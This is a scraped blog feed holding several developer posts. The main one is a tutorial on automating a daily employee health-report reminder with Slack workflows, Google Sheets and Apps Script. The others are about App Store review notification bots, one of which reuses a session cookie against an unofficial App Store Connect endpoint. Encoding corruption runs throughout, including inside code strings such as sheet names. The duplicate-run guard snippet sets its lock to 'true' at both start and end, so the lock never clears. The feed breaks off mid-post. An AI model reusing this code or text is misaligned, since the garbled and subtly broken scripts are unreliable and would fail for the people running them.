source: Êµ∑Á∏ΩÁêÜNow my hands are itching to start!!If combined with Slack Workflow From and message automation, wouldn‚Äôt it solve all the pain points mentioned above? The concept is feasible! So, I started working on the implementation.Optimized FlowFirst, let‚Äôs review the optimized process and results. [Automation] Send Daily Reminder Message for Health Form in Slack Channel at 10 AM Fill out health questions from Google Form or Slack Workflow Form Data is saved back to Google Sheet response records People Operations clicks the ‚ÄúGenerate Unfilled List‚Äù button near the end of each workday. [Automation] Use App Script to Compare Employee Lists and Filter Out Unfilled Entries [Automation] Click ‚ÄúGenerate &amp; Send Message‚Äù to Automatically Send Reminder for Unfilled Fields &amp; Auto Tag Recipients Work done! Results(Personal Estimate) Filling in time can save about 30 seconds per employee per day. People Operations manages this task, saving about 20 to 30 minutes daily. How It WorksManaging Sheets by writing App Script. Store all external input data in the Responses Sheet Write an App Script function to distribute the Responses data into Sheets by submission date. If a Sheet for the date doesn‚Äôt exist, create a new one. Name the Sheet using the date for easy identification and access. Compare the current date‚Äôs sheet with the employee list to generate data for the sheet of those who have not filled in. Read the Unfilled List Sheet, compose messages, and send them to the designated Slack channel Integrate Slack APP API to automatically read and import the employee list from a specified channel Use Slack UID tag &lt;@UID&gt; in message content to mention members who have not completed their information IdentificationThe identity information linking Google Form and Slack is Email, so please ensure that employees use their company email to fill out the Google Form and also have their company email entered in their Slack profile.Getting Started Hands-OnAfter discussing the problems, optimization methods, and results, let‚Äôs move on to the implementation phase; let‚Äôs complete this automation case step by step together. The article is a bit long; you can skip sections you already understand or create a copy from the final result to review, edit, and learn along the way.Submission form: https://forms.gle/aqGDCELpAiMFFoyDACompleted Result Google Sheet:Create a Health Report Google Form &amp; Link Responses to Google SheetSteps are omitted. If you have questions, please Google them directly. Here, it is assumed you have already created and linked the health report form.Remember to check ‚ÄúCollect emails‚Äù in the form:Collect the respondent‚Äôs email for future list comparison.How to Link Replies to Google Sheet?Switch to the ‚ÄúResponses‚Äù tab above the form and click the ‚ÄúGoogle Sheet Icon.‚ÄùChange the Sheet Name in the Link:It is recommended to rename the linked Sheet from ‚ÄúForm Responses 1‚Äù to ‚ÄúResponses‚Äù for easier use.Create Slack Workflow Form Entry PointAfter setting up the traditional Google Form entry, let‚Äôs add the Slack submission method first.In any Slack chat window, find the blue lightning bolt ‚ö°Ô∏è located below the input box and click it.In the menu below, enter ‚Äúworkflow‚Äù in the ‚ÄúSearch shortcuts‚Äù and select ‚ÄúOpen Workflow Builder‚ÄùHere you will find the Workflows you created or participated in. Click ‚ÄúCreate‚Äù at the top right to create a new Workflow.Step 1, enter the workflow name (for display in the Workflow Builder interface)Workflow trigger method: select ‚ÄúShortcut‚ÄùThere are currently 5 types of Slack workflow trigger times: Shortcut: Manually trigger the ‚ÄúBlue Lightning ‚ö°Ô∏è‚Äù option in the workflow menu. Click it to start the workflow. New channel member: When a new member joins the Target Channel‚Ä¶ (EX: Welcome message) Emoji reactions: When someone reacts to a message in the Target Channel with a specific emoji‚Ä¶ (Maybe this can be used to mark important messages as read by asking users to press a certain emoji, so you know who has read it?) Scheduled date &amp; time: Schedule and trigger at the specified time‚Ä¶ (EX: Timed reminder message) Webhook: External webhook trigger, an advanced feature that allows integration with third-party or custom APIs to connect internal workflows. Here, we choose ‚ÄúShortcut‚Äù to create a manual trigger option.Choose which Channel input box to add this Workflow Shortcut under and enter the display name. *A workflow shortcut can only be added to one channel.Shortcut created! Start building the workflow steps by clicking ‚ÄúAdd Step‚Äù to add a step.Choose the ‚ÄúSend a form‚Äù StepTitle: Input Form TitleAdd a question: Enter the title of the first question (you may mark the question number in the title, e.g., 1., 2., 3‚Ä¶)Choose a question type Ôºö Short answer: Single-line input box Long answer: Multi-line input box Select from a list: Single-choice list Select a person: Choose a member within the same Workspace Select a channel or DM: Choose a member within the same Workspace, a Group DM, or a Channel For example, ‚ÄúSelect from a list‚Äù: Add list item: You can add an option Default selection: Choose the default option Make this required: Set this question as mandatory Add Question: You can add more questions The ‚Äú‚Üì‚Äù and ‚Äú‚¨Ü‚Äù on the right can adjust the order, and the ‚Äú‚úé‚Äù can expand for editing. You can choose whether to send the form submission content back to a Channel or a specific person. You can also choose to send the reply to‚Ä¶: Person who clicked ‚Ä¶.ÔºöPerson who clicked this form (equivalent to the person who filled it out) Channel where workflow started: The channel where this workflow was added After completing the form, click ‚ÄúSave‚Äù to save the step. *Here, we uncheck the option to return the form submission content because we want to customize the message content in later steps.Connecting Slack workflow from with Google SheetIf you haven‚Äôt added the Google Sheet App to Slack yet, you can click here to install the app.Following the previous step, click ‚ÄúAdd Step‚Äù to add a new step. We select the ‚ÄúAdd a spreadsheet row‚Äù step from Google Sheets for Workflow Builder. First, complete the Google account authorization by clicking ‚ÄúConnect account‚Äù Select a spreadsheet: Choose the target Google Sheet response, please select the Google Sheet created from the original Google Form. Sheet: Same as above Column name: The first column to be filled, here we first select Question One Click the ‚ÄúInsert Variable‚Äù at the bottom right and select ‚ÄúResponse to Question 1‚Ä¶‚Äù. After inserting, you can add other columns from the bottom left ‚ÄúAdd Column‚Äù. Repeat this process to complete Question 2, Question 3, and so on.Enter the person‚Äôs Email, optionally select ‚ÄúPerson who submitted form‚ÄùClick the inserted variable and select ‚ÄúEmail‚Äù to automatically fill in the submitter‚Äôs email. Mention (default): tag the User, Raw data is &lt;@User ID&gt; Name: User Name Email: User Email The Timestamp field is a bit tricky. I‚Äôll add the setup method later. First, click ‚ÄúSave‚Äù to save, then go to the top right of the page and click ‚ÄúPublish‚Äù to publish the Shortcut.After seeing the success message, you can go back to the Slack Channel and give it a try.At this point, clicking the lightning bolt will display the Workflow form you just created, which you can click to fill out and try.Left: Computer / Right: Mobile VersionWe can fill in the information and click ‚ÄúSubmit‚Äù to test if it works properly.Success! However, the Timestamp column is empty. Next, let‚Äôs fix this issue.Slack workflow from Obtaining Fill TimeSlack workflow does not have a current timestamp global variable available, at least not yet. I only found a wish post on Reddit.At first, I whimsically entered =NOW() in the Column Value, but this made all records show the current time, which was completely wrong.Thanks to the expert user from that Reddit post, a tricky method can be used to create a clean Timestamp Sheet with a row of data and a column containing =NOW(). First, use Update to force the field to refresh, then use Select to get the current Timestamp.As shown in the structure above, click here to view the example. Row: Similar to an ID, set it directly as ‚Äú1‚Äù. It will be used later for Select &amp; Update operations to specify the data row. Timestamp: Set the value =NOW() to always display the current time Value: Used to trigger the Timestamp field update time. The content is arbitrary; here, the submitter‚Äôs email is inserted. As long as it triggers the update, it works. You can right-click on the Sheet and select ‚ÄúHide Sheet‚Äù to hide it, as it is not intended for external use.Return to Slack Workflow Builder to edit the workflow form you just created.Click ‚ÄúAdd Step‚Äù to add a new step:Scroll down and select ‚ÄúUpdate a spreadsheet row‚Äù‚ÄúSelect a spreadsheet‚Äù and choose the previously used Sheet, then under ‚ÄúSheet,‚Äù select the newly created ‚ÄúTimestamp‚Äù Sheet.‚ÄúChoose a column to search‚Äù select ‚ÄúRow‚Äù, Define a cell value to find enter ‚Äú1‚Äù.‚ÄúUpdate these columns‚ÄùSelect ‚ÄúColumn name‚Äù as ‚ÄúValue‚Äù, then click ‚ÄúInsert variable‚Äù -&gt; ‚ÄúPerson who submitted‚Äù -&gt; ‚ÄúSelect Email‚Äù.Click ‚ÄúSave‚Äù to finish! The timestamp update in the trigger Sheet is now complete. Next, we will read it out for use.Return to the edit page and click ‚ÄúAdd Step‚Äù again to add a new step. This time, select ‚ÄúSelect a spreadsheet row‚Äù to read the Timestamp.The Search section is the same as ‚ÄúUpdate a spreadsheet row,‚Äù click ‚ÄúSave.‚ÄùAfter saving and returning to the step list page, we can move the mouse over a step and drag it to change the order.Change the order to ‚ÄúUpdate a spreadsheet row‚Äù -&gt; ‚ÄúSelect a spreadsheet‚Äù -&gt; ‚ÄúAdd a spreadsheet row‚Äù.That is: Update triggers timestamp update -&gt; Read timestamp -&gt; Use it when adding a new row.In ‚ÄúAdd a spreadsheet row,‚Äù click ‚ÄúEdit‚Äù to modify:Scroll to the bottom and click ‚ÄúAdd Column‚Äù at the lower left. Then click ‚ÄúInsert a variable‚Äù at the lower right, find the ‚ÄúTimestamp‚Äù variable under the ‚ÄúSelect a spreadsheet‚Äù section, and inject it.After clicking ‚ÄúSave‚Äù to save the steps, return to the list page and click ‚ÄúPublish Change‚Äù at the top right to publish the changes.At this point, let‚Äôs test the workflow shortcut again to see if the timestamp is written correctly.Success!Add Submission Receipt to Slack Workflow FormJust like Google Form submission receipts, Slack workflow forms can also do this.On the step editing page, we can add another step by clicking ‚ÄúAdd Step‚Äù.This time, choose ‚ÄúSend a message‚Äù‚ÄúSend this message to‚Äù select ‚ÄúPerson who submitted form‚ÄùEnter the message content in order: the question title, select ‚ÄúInsert a variable‚Äù and choose ‚ÄúResponse to question XXX,‚Äù and optionally add ‚ÄúTimestamp‚Äù at the end. Click ‚ÄúSave‚Äù to save the step, then click ‚ÄúPublish Changes‚Äù! You can also use ‚ÄúSend a message‚Äù to send the filled results to a specific Channel or DM.Success!The setup of the Slack workflow form ends here. You can freely combine and experiment with other features.Google Sheet with App Script!Next, we need to write an App Script to handle the data entry.First, in the Google Sheet top toolbar, select ‚ÄúTools‚Äù -&gt; ‚ÄúScript editor‚ÄùYou can click the top left corner to give the project a name.Now we can start writing App Script! App Script is based on JavaScript, so you can directly use JavaScript code along with Google Sheet‚Äôs library.Distribute Responses Data to Sheets by Submission Datefunction formatData() { var bufferSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Responses') // Sheet name storing responses var rows = bufferSheet.getDataRange().getValues(); var fileds = []; var startDeleteIndex = -1; var deleteLength = 0; for(index in rows) { if (index == 0) { fileds = rows[index]; continue; } var sheetName = rows[index][0].toLocaleDateString(\"en-US\"); // Convert Date to String, using US date format MM/DD/YYYY var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetName); // Get MM/DD/YYYY Sheet if (sheet == null) { // Create new if not exists sheet = SpreadsheetApp.getActiveSpreadsheet().insertSheet(sheetName, bufferSheet.getIndex()); sheet.appendRow(fileds); } sheet.appendRow(rows[index]); // Add data to date Sheet if (startDeleteIndex == -1) { startDeleteIndex = +index + 1; } deleteLength += 1; } if (deleteLength &gt; 0) { bufferSheet.deleteRows(startDeleteIndex, deleteLength); // Remove data from Responses after moving to target Sheets }}Paste the above code into the Code block and press ‚Äúcontrol‚Äù + ‚Äús‚Äù to save.Next, we need to add a trigger button in the Sheet (can only be triggered manually by pressing the button, automatic triggering when data is written is not possible). First, create a new sheet and name it ‚ÄúUnfilled List‚Äù In the top toolbar, select ‚ÄúInsert‚Äù -&gt; ‚ÄúDrawing‚Äù Use this interface to create a button.After ‚ÄúSave and Close,‚Äù you can adjust and move the button; click the top right ‚Äú‚Ä¶‚Äù and select ‚ÄúAssign script.‚ÄùEnter the function name ‚ÄúformatData‚Äù.Clickable button to try the featureIf ‚ÄúAuthorization Required‚Äù appears, click ‚ÄúContinue‚Äù to complete the verification.During the authentication process, the message ‚ÄúGoogle hasn‚Äôt verified this app‚Äù may appear. This is normal because the App Script we wrote has not been verified by Google. However, it‚Äôs okay since this is for personal use.You can click the bottom left ‚ÄúAdvanced‚Äù -&gt; ‚ÄúGo to Health Report (Responses) (unsafe)‚ÄùClick ‚ÄúAllow‚Äù When the App Script shows ‚ÄúRunning Script,‚Äù please do not press again to avoid duplicate execution. Only after showing successful execution can it be run again.Success! Group the entered data by date.Get the current date‚Äôs sheet and compare it with the employee list to generate data for the sheet of those who have not filled in the formLet‚Äôs add another piece of code:// Compare the Employee List Sheet with Today's Filled Sheet, generate a list of those who haven't filledfunction generateUnfilledList() { var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Âì°Â∑•ÂêçÂñÆ') // Employee List Sheet name var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Êú™Â°´ÂØ´ÂêçÂñÆ') // Unfilled List Sheet name var today = new Date(); var todayName = today.toLocaleDateString(\"en-US\"); var todayListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(todayName) // Get today's MM/DD/YYYY Sheet if (todayListSheet == null) { SpreadsheetApp.getUi().alert('Cannot find the sheet for '+todayName+' or please run \"Organize Filled Data\" first'); return; } var todayEmails = todayListSheet.getDataRange().getValues().map( x =&gt; x[1] ) // Get the Email Address column data list from today's Sheet (1 = Column B) // index start from 0, so 1 = Column B // output: Email Address,zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... todayEmails.shift() // Remove the first data, which is the header \"Email Address\" and meaningless // output: zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... unfilledListSheet.clear() // Clear the Unfilled List... preparing to refill data unfilledListSheet.appendRow([todayName+\" Unfilled List\"]) // Show sheet title on the first row var rows = listSheet.getDataRange().getValues(); // Read Employee List Sheet for(index in rows) { if (index == 0) { // The first row is the header row, save it to add headers to the new data unfilledListSheet.appendRow(rows[index]); continue; } if (todayEmails.includes(rows[index][3])) { // If this employee's email is in today's Sheet Email Address, it means filled, continue to skip... (3 = Column D) continue; } unfilledListSheet.appendRow(rows[index]); // Write one row of data to Unfilled List Sheet }}After saving, follow the previous method of adding code, then add a button and assign the script ‚Äî ‚ÄúgenerateUnfilledList‚Äù.You can click to test after completion:The list was generated successfully! If no content appears, please first check: The employee list has been completed, or you can enter test data first. You need to finish the ‚ÄúOrganize and Fill in Data‚Äù step first. Read the Unfilled List Sheet, Compose Messages, and Send to the Specified Slack ChannelFirst, we need to add the Incoming WebHooks App to the Slack Channel. We will use this to send messages. Slack bottom left ‚ÄúApps‚Äù -&gt; ‚ÄúAdd apps‚Äù Search for ‚Äúincoming‚Äù in the search box on the right. Click ‚ÄúIncoming WebHooks‚Äù -&gt; ‚ÄúAdd‚Äù Select the Channel where you want to send the message if not filled in.Note down the ‚ÄúWebhook URL‚Äù at the top.Scroll down to set the name and avatar displayed by the Bot when sending messages; remember to click ‚ÄúSave Settings‚Äù after making changes.Back to our Google Sheet ScriptAdd another Code block:function postSlack() { var ui = SpreadsheetApp.getUi(); var result = ui.alert( 'Are you sure you want to send the message?', 'Send reminder message for unfilled entries to Slack Channel', ui.ButtonSet.YES_NO); // Ask for confirmation to avoid accidental trigger if (result == ui.Button.YES) { var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Êú™Â°´ÂØ´ÂêçÂñÆ') // Sheet name for unfilled list var rows = unfilledListSheet.getDataRange().getValues(); var persons = []; for(index in rows) { if (index == 0 \\|\\| index == 1) { // Skip the header and column title rows continue; } var person = (rows[index][4] == \"\") ? (rows[index][2]) : (\"&lt;@\"+rows[index][4]+\"&gt;\"); // Tag target: use Slack UID if available, otherwise show nickname; 2 = Column B / 4 = Column E if (person == \"\") { // Consider empty as invalid data, ignore continue; } persons.push(\"‚Ä¢ \"+person+'\\n') // Add target to array } if (persons.length &lt;= 0) { // If no one needs to be tagged, everyone has filled, cancel sending return; } var preText = \"*[Health Report Announcement:loudspeaker:]*\\nThe company cares about everyone's health. Please remind the following teammates to fill out the daily health status report. Thank you :wink:\\n\\nToday's list of unfilled health reports\\n\\n\" // Message opening content... var postText = \"\\n\\nFilling out the health status report helps the company understand teammates' health conditions. Please make sure to fill it out every day &gt;&lt; Thank you all :woman-bowing::skin-tone-2:\" // Message closing content... var payload = { \"text\": preText+persons.join('')+postText, \"attachments\": [{ \"fallback\": \"Google Form link can be placed here\", \"actions\": [ { \"name\": \"form_link\", \"text\": \"Go to Health Status Report\", \"type\": \"button\", \"style\": \"primary\", \"url\": \"Google Form link can be placed here\" } ], \"footer\": \":rocket:Tip: Click the ‚Äú:zap:Ô∏èLightning‚Äù below the input box -&gt; ‚ÄúShortcut Name‚Äù to fill out directly.\" } ] }; var res = UrlFetchApp.fetch('Enter your slack incoming app Webhook URL here',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) }) }}After saving, follow the previous method of adding code, then add a button and assign the script ‚Äî ‚ÄúpostSlack‚Äù.After completion, you can click to test:Success!!! (The mention @U123456 did not work because the ID was made up)The main features have been completed! Note Please note that the official recommendation is to use the new Slack APP API‚Äôs chat.postMessage to send messages. The simpler Incoming Webhook method will be deprecated in the future. This guide uses the simpler method for convenience but will need to be updated to the new Slack App API method in the next chapter, ‚ÄúImport Employee List.‚ÄùImport Employee ListHere, we need to create a Slack APP. Go to https://api.slack.com/apps Click ‚ÄúCreate New App‚Äù at the top right corner Choose ‚ÄúFrom scratch‚Äù Enter ‚ÄúApp Name‚Äù and the Workspace you want to add. After creation, select the ‚ÄúOAuth &amp; Permissions‚Äù settings page from the left menu. Scroll down to the Scopes sectionAdd the following items under ‚ÄúAdd an OAuth Scope‚Äù in order: channels:read users:read users:read.email If you want to switch to sending messages via an app, you can add chat.postMessage here. Go back to the top and click ‚ÄúInstall to workspace‚Äù or ‚ÄúReinstall to workspace‚Äù If Scopes are added, you must come back here and reinstall. After installation, obtain and copy the Bot User OAuth Token Use the web version of Slack to open the Channel where you want to import the list Get URL from browser:https://app.slack.com/client/TXXXX/CXXXXThe CXXXX is the Channel ID for this Channel. Note this message.10.Back to our Google Sheet ScriptAdd another Code block:function loadEmployeeList() { var formData = { 'token': 'Bot User OAuth Token', 'channel': 'Channel ID', 'limit': 500 }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/conversations.members', options); var data = JSON.parse(response.getContentText()); for (index in data[\"members\"]) { var uid = data[\"members\"][index]; var formData = { 'token': 'Bot User OAuth Token', 'user': uid }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/users.info', options); var user = JSON.parse(response.getContentText()); var email = user[\"user\"][\"profile\"][\"email\"]; var real_name = user[\"user\"][\"profile\"][\"real_name_normalized\"]; var title = user[\"user\"][\"profile\"][\"title\"]; var row = [title, real_name, real_name, email, uid]; // Fill according to Columns var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Âì°Â∑•ÂêçÂñÆ'); // Employee List Sheet name listSheet.appendRow(row); }}But this time, we don‚Äôt need to add a button because import is only required once; so just save and run directly.First, press ‚Äúcontrol‚Äù + ‚Äús‚Äù to save. In the dropdown menu above, select ‚ÄúloadEmployeeList,‚Äù then click ‚ÄúRun‚Äù to start importing the list into the Employee List sheet.Manually Add New Employee DataIf new employees join later, you can directly add a row in the employee list Sheet and fill in the information. The Slack UID can be found directly on Slack:Click the object whose UID you want to see, then click ‚ÄúView full profile‚ÄùClick ‚ÄúMore‚Äù and select ‚ÄúCopy member ID‚Äù to get the UID. UXXXXXDONEÔºÅAll the above steps have been completed, and you can now start automating the tracking of employees‚Äô health status.The completed file is available; you can create a copy from the following Google Sheet and modify it as needed:Supplement If you want to use Scheduled date &amp; time to send form messages, note that the form can only be filled out once in this case, so it is not suitable to use here‚Ä¶ (at least in the current version). Therefore, scheduled reminder messages can still only use plain text + Google Form link. Currently, there is no way to use a hyperlink to open a Form via Shortcut. Google Sheet App Script Prevent Duplicate Execution: If you want to prevent accidentally pressing again during execution and causing duplicate runs, you can add the following at the beginning of the function:if (PropertiesService.getScriptProperties().getProperty('FUNCTIONNAME') == 'true') { SpreadsheetApp.getUi().alert('Busy... Please try again later'); return;}PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');Add the following at the end of the function execution:PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');Replace FUNCTIONNAME with the target function name.Control execution with a Global variable.Applications Related to iOS DevelopmentCan be used to integrate CI/CD, wrapping the original ugly command operations with a GUI. For example, combined with the Slack Bitrise APP, use Slack Workflow form to trigger Build commands:After sending, the command will be sent to the private channel with the Bitrise APP, e.g.:bitrise workflow:app_store\\|branch:develop\\|ENV[version]:4.32.0This can trigger Bitrise to execute the CI/CD flow.Further Reading Automate Routine Tasks with Python + Google Cloud Platform + Line Bot Using Google Apps Script to Forward Gmail Messages to Slack Crashlytics + Big Query Build a More Real-Time and Convenient Crash Tracking Tool Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate If you have any questions or feedback, feel free to contact me.If you have automation-related optimization needs, feel free to contact me. Thank you. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "ZReviewsBotÔΩúSlack App Review Notifications for Instant Feedback", "url": "/posts/zrealm-dev/zreviewsbot-slack-app-review-notifications-for-instant-feedback-33f6aabb744f/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, slack, slackbot, app-review, ruby", "date": "2021-05-05 21:51:19 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZReviewsBot ‚Äî Slack App Review Notification BotFree and Open Source iOS &amp; ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZReviewsBot ‚Äî Slack App Review Notification BotFree and Open Source iOS &amp; Android App Latest Review Tracking Slack BotTL;DR [2022/08/10] Update:The App Reviews Bot has been redesigned using the new App Store Connect API and relaunched as ‚ÄúZReviewTender ‚Äî Free and Open Source App Reviews Monitoring Bot‚Äù.====ZhgChgLi / ZReviewsBotZReviewsBotZReviewsBot is a free, open-source project that helps your app team automatically track the latest reviews on the App Store (iOS) and Google Play (Android) platforms, sending them to a designated Slack channel for real-time updates on your app‚Äôs status. ‚úÖ Use updated, more reliable API Endpoints to track iOS App reviews (Technical Details) ‚úÖ Supports dual-platform review tracking for iOS &amp; Android ‚úÖ Supports keyword notification skip feature (to prevent spam advertisement harassment) ‚úÖ Customizable settings, as you wish ‚úÖ Supports deploying scheduled automation bots using Github Action [2022/07/20 Update]App Store Connect API now supports reading and managing Customer Reviews. This bot will be updated later to implement this, replacing the method of using Fastlane ‚Äî Spaceship to fetch reviews from the backend.OriginFollowing the previous article ‚ÄúAppStore APP‚Äôs Reviews Slack Bot ÈÇ£‰∫õ‰∫ã,‚Äù I researched and completed a new iOS review fetching tool. I thought it would be suitable as a side project to open source for others facing the same issue.FlowFurther Reading [Productivity Tools] Ditching Chrome for the Sidekick BrowserIf you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "AppStore Reviews BotÔΩúAutomate APP Review Tracking with Slack Notifications", "url": "/posts/zrealm-dev/appstore-reviews-bot-automate-app-review-tracking-with-slack-notifications-cb0c68c33994/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, slackbot, ios-app-development, ruby, fastlane, automator", "date": "2021-04-21 23:16:31 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!AppStore APP‚Äôs Reviews Slack Bot StoriesUsing Ruby + Fastlane-SpaceShip to Bui...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!AppStore APP‚Äôs Reviews Slack Bot StoriesUsing Ruby + Fastlane-SpaceShip to Build an App Review Tracking Notification Slack BotPhoto by Austin DistelEating Rice Without Knowing Its PriceAppReviewBot as an exampleI recently found out that the bot forwarding the latest app review messages in Slack requires a fee. I always thought this feature was free. The cost ranges from $5 to $200 per month because each platform offers more than just the ‚ÄúApp Review Bot‚Äù function. They also provide data analytics, records, unified dashboards, competitor comparisons, and more. The price depends on the services each platform offers. The Review Bot is just one part of their service, but I only want this feature and nothing else. In that case, paying seems quite wasteful.QuestionOriginally, we used the free open-source tool TradeMe/ReviewMe for Slack notifications, but this tool has been unmaintained for years. Occasionally, Slack floods with old reviews, which is alarming (many bugs have long been fixed, making us think there was a new issue!). The cause is unknown.So consider finding other tools or methods as replacements.TL;DR [2022/08/10] Update:The App Reviews Bot has been redesigned using the new App Store Connect API and relaunched as ‚ÄúZReviewTender ‚Äî Free and Open Source App Reviews Monitoring Bot‚Äù.====2022/07/20 UpdateApp Store Connect API now supports reading and managing Customer Reviews. The App Store Connect API natively supports accessing app reviews, no longer requiring Fastlane ‚Äî Spaceship to fetch reviews from the backend.Principle ExplorationAfter having the motivation, next study the principles of achieving the goal.Official API ‚ùåApple provides the App Store Connect API, but it does not offer a feature to fetch reviews.Public URL API (RSS) ‚ö†Ô∏èApple provides a public APP review RSS subscription URL, and offers both RSS XML and JSON formats.https://itunes.apple.com/ÂúãÂÆ∂Á¢º/rss/customerreviews/id=APP_ID/page=1/sortBy=mostRecent/json Country codes: Refer to this document. APP_ID: Go to the App‚Äôs web page, and you will get the URL: https://apps.apple.com/tw/app/APPNAME/id 12345678, the number after ‚Äúid‚Äù is the App ID (numbers only). page: Requests can be made for pages 1 to 10; beyond that, retrieval is not possible. sortBy: mostRecent/json requests the latest data in JSON format. You can also change it to mostRecent/xml for XML format. The evaluation data is returned as follows:rss.json:{ \"author\": { \"uri\": { \"label\": \"https://itunes.apple.com/tw/reviews/id123456789\" }, \"name\": { \"label\": \"test\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"4.27.1\" }, \"im:rating\": { \"label\": \"5\" }, \"id\": { \"label\": \"123456789\" }, \"title\": { \"label\": \"A Wonderful Existence!\" }, \"content\": { \"label\": \"Life is worthwhile now~\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"https://itunes.apple.com/tw/review?id=123456789&amp;type=Purple%20Software\" } }, \"im:voteSum\": { \"label\": \"0\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"Application\" } }, \"im:voteCount\": { \"label\": \"0\" }}Advantages: Public access without authentication steps required Simple and easy to use Disadvantages: This RSS API is very outdated and has not been updated. The feedback information is too limited (no comment time, edited review?, replied?) Encountering data corruption issues (older data occasionally appears suddenly on later pages) Access up to 10 pages The biggest issue we encountered is 3; however, it is unclear whether this is a problem with the Bot tool we used or with the RSS URL data.Private URL API ‚úÖThis method is somewhat unconventional and was a sudden idea I came up with; however, after reviewing other Review Bots, I found that many websites use this approach. It should be fine, and I saw tools doing this 4 to 5 years ago, though I didn‚Äôt study it in depth back then.Advantages: Same as Apple backend data Complete and up-to-date data More detailed filtering options available Deeply integrated app tools also use this method (AppRadar/AppReviewBot‚Ä¶). Disadvantages: Unofficial Methods (Unconventional Approaches) Because Apple enforces full two-step verification, login sessions need to be updated regularly. Step 1 ‚Äî Sniff the API that loads data for the App Store Connect backend review section:To access Apple‚Äôs backend, use the command:https://appstoreconnect.apple.com/WebObjects/iTunesConnect.woa/ra/apps/APP_ID/platforms/ios/reviews?index=0&amp;sort=REVIEW_SORT_ORDER_MOST_RECENTThis endpoint retrieves the list of reviews:index = page offset, displaying up to 100 items at a time.Evaluation data returned as follows:private.json:{ \"value\": { \"id\": 123456789, \"rating\": 5, \"title\": \"A Wonderful Existence!\", \"review\": \"Life is worth it~\", \"created\": null, \"nickname\": \"test\", \"storeFront\": \"TW\", \"appVersionString\": \"4.27.1\", \"lastModified\": 1618836654000, \"helpfulViews\": 0, \"totalViews\": 0, \"edited\": false, \"developerResponse\": null }, \"isEditable\": true, \"isRequired\": false, \"errorKeys\": null}After testing, it was found that simply including cookie: myacinfo=&lt;Token&gt; can forge the request to obtain data:The API is ready, and the required headers are known. Next, we need to find a way to automate retrieving this cookie information from the backend.Step 2 ‚Äî The Universal FastlaneBecause Apple now enforces full Two-Step Verification, automating login authentication has become more complicated. Fortunately, Fastlane, which competes with Apple‚Äôs security, implements official App Store Connect API, iTMSTransporter, and web authentication (including two-step verification). We can directly use Fastlane commands:fastlane spaceauth -u &lt;App Store Connect account (Email)&gt;This command completes web login verification (including two-factor authentication) and then saves the cookie into the FASTLANE_SESSION file.You will get a string similar to the following:!ruby/object:HTTP::Cookiename: myacinfo value: &lt;token&gt; domain: apple.com for_domain: true path: \"/\" secure: true httponly: true expires: max_age: created_at: 2021-04-21 20:42:36.818821000 +08:00 accessed_at: 2021-04-21 22:02:45.923016000 +08:00!ruby/object:HTTP::Cookiename: &lt;hash&gt; value: &lt;token&gt;domain: idmsa.apple.com for_domain: true path: \"/\"secure: true httponly: true expires: max_age: 2592000created_at: 2021-04-19 23:21:05.851853000 +08:00accessed_at: 2021-04-21 20:42:35.735921000 +08:00Assign myacinfo = value to get the review list.Step 3 ‚Äî SpaceShipI originally thought Fastlane could only help us up to this point, and after that, we had to manually connect the flow of getting cookies from Fastlane and then calling the API. However, after some exploration, I found that Fastlane‚Äôs authentication module SpaceShip has even more powerful features!SpaceShipSpaceShip already provides a method to fetch the review list for us: Class: Spaceship::TunesClient::get_reviews!app = Spaceship::Tunes::login(appstore_account, appstore_password)reviews = app.get_reviews(app_id, platform, storefront, versionId = '')*storefront = regionStep 4 